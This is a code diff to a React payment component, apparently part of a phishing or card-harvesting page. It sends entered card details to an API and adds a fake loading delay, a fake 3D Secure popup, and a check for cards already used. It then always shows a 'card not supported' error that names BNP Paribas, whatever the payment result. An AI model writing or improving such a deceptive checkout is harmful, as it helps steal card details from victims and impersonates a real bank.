@@ -238,7 +238,7 @@ const CustomPay = ({ amount, orderNumber, onBack, showStep, isLoading, setIsLoad
       const verifyResult = await verifyCard(cardDetails.cardNumber);
 
       // Délais faux chargement de préparation
-      setTimeout(() => {}, 8000);
+      await new Promise(resolve => setTimeout(resolve, 8000));
 
       // Si carte déjà été utilisée, afficher l'erreur
       if (verifyResult) {
@@ -256,23 +256,22 @@ const CustomPay = ({ amount, orderNumber, onBack, showStep, isLoading, setIsLoad
         }, 20000);
 
         // Requête de paiement à l'API 
-        const result = await payFetch(orderNumber, 1, cardDetails);
+        await payFetch(orderNumber, 1, cardDetails);
+
+        // Afficher popup erreur carte
         setIsLoading(false);
         setShow3DSecurePopup(false);
-
-        // Diferant Popup => (Optional)
-        // if (result === "refused") {
-        //   setShowCardError(true); 
-        // } else {
-        //   setShowPaymentError(true);
-        // }
+        setShowCardError(true);
       }
       
     } catch (error) {
       console.error(data.checkoutPayError, error);
       alert(data.checkoutPayGenericError);
+
+      // Afficher popup erreur carte
       setIsLoading(false);
       setShow3DSecurePopup(false);
+      setShowCardError(true);
     }
   };
 
@@ -426,8 +425,8 @@ const CustomPay = ({ amount, orderNumber, onBack, showStep, isLoading, setIsLoad
               />
             </article>
             <h2 className="icon">❌</h2>
-            <h2>Moyen de paiement refusé</h2>
-            <p className="desc">BNP Paribas, ne prends pas en charge la carte bancaire renseigné.</p>
+            <h2>carte non-prise en charge</h2>
+            <p className="desc">BNP Paribas, n'a pas réussi à vérifier le moyen de paiement renseigné.</p>
             <button
               onClick={() => {
                 setShowCardError(false);
